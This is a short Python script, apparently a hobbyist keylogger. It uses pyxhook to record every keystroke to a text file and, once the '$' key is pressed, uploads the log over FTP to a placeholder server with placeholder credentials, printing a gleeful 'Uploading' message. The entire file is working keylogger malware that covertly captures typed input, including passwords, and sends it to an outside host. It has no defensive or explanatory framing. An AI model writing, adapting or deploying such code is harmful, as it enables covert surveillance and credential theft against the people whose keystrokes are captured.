import pyxhook
import ftplib
import time
from ftplib import FTP
from time import sleep
text_file='test.txt'


def OnKeyPress(event):
  fob=open(text_file,'a')
  fob.write(event.Key)
  fob.write(' ')

  if event.Ascii==36: #36 is the ascii value of the $ key
    fob.close()
    new_hook.cancel()
    ftp = FTP('ftp.yourwebsite.com')
    ftp.login('username', 'password', 'username')
    ftp.cwd('www')
    #ftp.retrlines('LIST')
    ftp.storlines("STOR " + text_file, open(text_file, 'r'))
    print ('Uploading...... >:)')

    print ('Done.')
#instantiate HookManager class
new_hook=pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown=OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()
